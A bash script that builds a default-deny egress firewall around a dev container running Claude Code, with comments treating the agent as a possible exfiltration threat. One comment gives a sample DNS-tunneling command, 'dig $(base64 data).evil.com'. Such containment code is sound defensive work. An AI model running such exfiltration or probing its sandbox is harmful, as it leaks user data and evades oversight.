#!/bin/bash
# =============================================================================
# Dev Container Egress Firewall
# =============================================================================
# Restricts outbound network traffic to only the domains Claude Code and
# your development tools need. Default-deny policy with explicit allowlist.
#
# CDN-safe design: domains are resolved into an ipset with a 10-minute TTL.
# A background daemon (refresh-firewall-dns.sh) re-resolves every 4 minutes
# so that CDN IP rotations (Anthropic, Sentry, etc.) don't break connectivity.
#
# Requires: NET_ADMIN and NET_RAW capabilities in devcontainer.json runArgs.
#
# Domain allowlist: edit firewall-allowed-domains.conf (shared with refresher).
# =============================================================================

set -euo pipefail
IFS=$'\n\t'

# ---------------------------------------------------------------------------
# Idempotency: skip if firewall is already configured
# ---------------------------------------------------------------------------
# Prevents the TOCTOU race window during flush-and-rebuild if Claude
# triggers a re-run of this script via sudo.
LOCK_FILE="/tmp/.firewall-initialized"
if [ -f "$LOCK_FILE" ]; then
    echo "Firewall already initialized (remove $LOCK_FILE to re-run)."
    exit 0
fi

# ---------------------------------------------------------------------------
# Install shared domain list
# ---------------------------------------------------------------------------
# Copy to /usr/local/etc so both init and refresher scripts can read it.
DOMAINS_SRC="/workspace/.devcontainer/firewall-allowed-domains.conf"
DOMAINS_DST="/usr/local/etc/firewall-allowed-domains.conf"

if [ -f "$DOMAINS_SRC" ]; then
    cp "$DOMAINS_SRC" "$DOMAINS_DST"
else
    echo "ERROR: $DOMAINS_SRC not found"
    exit 1
fi

# ---------------------------------------------------------------------------
# Preserve Docker DNS before flushing
# ---------------------------------------------------------------------------
# Preserve NAT rules for Docker's embedded DNS (127.0.0.11) or any
# container-runtime DNS NAT rules matching configured nameservers.
DNS_PATTERN=$(awk '/^nameserver/ {print $2}' /etc/resolv.conf | sed 's/\./\\\\./g' | paste -sd'|' -)
DOCKER_DNS_RULES=$(iptables-save -t nat | grep -E "(${DNS_PATTERN:-127\\.0\\.0\\.11})" || true)

# ---------------------------------------------------------------------------
# Flush existing rules
# ---------------------------------------------------------------------------
iptables -F
iptables -X
iptables -t nat -F
iptables -t nat -X
iptables -t mangle -F
iptables -t mangle -X
ipset destroy allowed-domains 2>/dev/null || true

# ---------------------------------------------------------------------------
# Restore Docker DNS
# ---------------------------------------------------------------------------
if [ -n "$DOCKER_DNS_RULES" ]; then
    echo "Restoring Docker DNS rules..."
    iptables -t nat -N DOCKER_OUTPUT 2>/dev/null || true
    iptables -t nat -N DOCKER_POSTROUTING 2>/dev/null || true
    echo "$DOCKER_DNS_RULES" | xargs -L 1 iptables -t nat
else
    echo "No Docker DNS rules to restore"
fi

# ---------------------------------------------------------------------------
# Base rules: DNS (restricted), localhost
# ---------------------------------------------------------------------------
# SECURITY: DNS is restricted to the container's configured resolver(s) only.
# This mitigates DNS tunneling (CRITICAL-1 from audit): without this,
# Claude could exfiltrate data via DNS queries to attacker-controlled
# nameservers (e.g., dig $(base64 data).evil.com).
#
# Standard Docker uses 127.0.0.11 (embedded DNS with NAT rewriting).
# Other runtimes (OrbStack, Podman, etc.) may use different resolvers.
# We detect the actual nameservers from /etc/resolv.conf.
# TCP/53 is needed for truncated responses that retry over TCP.
DNS_SERVERS=$(awk '/^nameserver/ {print $2}' /etc/resolv.conf)
if [ -z "$DNS_SERVERS" ]; then
    echo "ERROR: No nameservers found in /etc/resolv.conf"
    exit 1
fi

for dns in $DNS_SERVERS; do
    echo "Allowing DNS to $dns"
    iptables -A OUTPUT -p udp -d "$dns" --dport 53 -j ACCEPT
    iptables -A OUTPUT -p tcp -d "$dns" --dport 53 -j ACCEPT
done
iptables -A INPUT -p udp --sport 53 -m state --state ESTABLISHED -j ACCEPT
iptables -A INPUT -p tcp --sport 53 -m state --state ESTABLISHED -j ACCEPT
# Allow localhost
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

# ---------------------------------------------------------------------------
# Create ipset with timeout support
# ---------------------------------------------------------------------------
# Entries expire after 600s (10 min). The refresh daemon re-adds them every
# 240s (4 min), so valid IPs always stay live. Stale CDN IPs age out
# naturally. This solves the CDN rotation problem without needing to flush.
ipset create allowed-domains hash:net timeout 600

# ---------------------------------------------------------------------------
# Add GitHub IP ranges
# ---------------------------------------------------------------------------
echo "Fetching GitHub IP ranges..."
gh_ranges=$(curl -s --connect-timeout 10 https://api.github.com/meta)
if [ -z "$gh_ranges" ]; then
    echo "ERROR: Failed to fetch GitHub IP ranges"
    exit 1
fi

if ! echo "$gh_ranges" | jq -e '.web and .api and .git' >/dev/null; then
    echo "ERROR: GitHub API response missing required fields"
    exit 1
fi

echo "Processing GitHub IPs..."
while read -r cidr; do
    if [[ ! "$cidr" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/[0-9]{1,2}$ ]]; then
        echo "ERROR: Invalid CIDR range from GitHub meta: $cidr"
        exit 1
    fi
    # GitHub publishes stable CIDR ranges — use long timeout (24h)
    ipset add -exist allowed-domains "$cidr" timeout 86400
done < <(echo "$gh_ranges" | jq -r '(.web + .api + .git)[]' | aggregate -q)

# ---------------------------------------------------------------------------
# Initial DNS resolution for allowed domains
# ---------------------------------------------------------------------------
echo "Resolving allowed domains..."
/usr/local/bin/refresh-firewall-dns.sh once

# ---------------------------------------------------------------------------
# Block cloud metadata endpoint (before any host network rules)
# ---------------------------------------------------------------------------
# Prevents access to cloud provider metadata services which can expose
# IAM credentials, instance identity, and other sensitive data.
iptables -A OUTPUT -d 169.254.169.254 -j REJECT --reject-with icmp-admin-prohibited
# Azure metadata
iptables -A OUTPUT -d 169.254.169.253 -j REJECT --reject-with icmp-admin-prohibited

# ---------------------------------------------------------------------------
# Allow host network (restricted to gateway IP only)
# ---------------------------------------------------------------------------
# SECURITY: Only the Docker gateway IP is allowed, not the entire /24 subnet.
# This prevents Claude from port-scanning host services, accessing other
# containers, or reaching services exposed on the Docker bridge network.
# (CRITICAL-3 from audit: previously allowed entire /24)
HOST_IP=$(ip route | grep default | cut -d" " -f3)
if [ -z "$HOST_IP" ]; then
    echo "ERROR: Failed to detect host IP"
    exit 1
fi

echo "Host gateway: $HOST_IP"
iptables -A INPUT -s "$HOST_IP" -j ACCEPT
iptables -A OUTPUT -d "$HOST_IP" -j ACCEPT

# ---------------------------------------------------------------------------
# Block ICMP (prevents ICMP tunneling via NET_RAW capability)
# ---------------------------------------------------------------------------
iptables -A OUTPUT -p icmp -j REJECT --reject-with icmp-admin-prohibited

# ---------------------------------------------------------------------------
# Default deny + allow only approved destinations
# ---------------------------------------------------------------------------
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT DROP

iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A OUTPUT -m set --match-set allowed-domains dst -j ACCEPT
iptables -A OUTPUT -j REJECT --reject-with icmp-admin-prohibited

# ---------------------------------------------------------------------------
# Verification
# ---------------------------------------------------------------------------
echo "Firewall configured. Verifying..."

if curl --connect-timeout 5 https://example.com >/dev/null 2>&1; then
    echo "FAIL: Reached example.com (should be blocked)"
    exit 1
else
    echo "PASS: example.com blocked as expected"
fi

if ! curl --connect-timeout 5 https://api.anthropic.com >/dev/null 2>&1; then
    echo "FAIL: Cannot reach api.anthropic.com (should be allowed)"
    exit 1
else
    echo "PASS: api.anthropic.com reachable as expected"
fi

if ! curl --connect-timeout 5 https://api.github.com/zen >/dev/null 2>&1; then
    echo "FAIL: Cannot reach api.github.com (should be allowed)"
    exit 1
else
    echo "PASS: api.github.com reachable as expected"
fi

# ---------------------------------------------------------------------------
# Block all IPv6 traffic
# ---------------------------------------------------------------------------
# If Docker is configured with --ipv6, all IPv6 traffic would bypass the
# IPv4 firewall rules entirely. Block it unconditionally.
if command -v ip6tables &>/dev/null; then
    ip6tables -P INPUT DROP 2>/dev/null || true
    ip6tables -P OUTPUT DROP 2>/dev/null || true
    ip6tables -P FORWARD DROP 2>/dev/null || true
    echo "IPv6 blocked."
fi

# ---------------------------------------------------------------------------
# Start background DNS refresh daemon
# ---------------------------------------------------------------------------
# Re-resolves all allowed domains every 4 minutes so CDN IP rotations
# don't break connectivity. Entries have 10-min TTL, so there's always
# overlap between refresh and expiry.
echo "Starting DNS refresh daemon..."
nohup /usr/local/bin/refresh-firewall-dns.sh loop >/tmp/refresh-firewall-dns.log 2>&1 &
echo "DNS refresh daemon PID: $!"

# Mark firewall as initialized (prevents flush-and-rebuild race on re-run)
touch "$LOCK_FILE"

echo "Firewall ready (with background DNS refresh)."
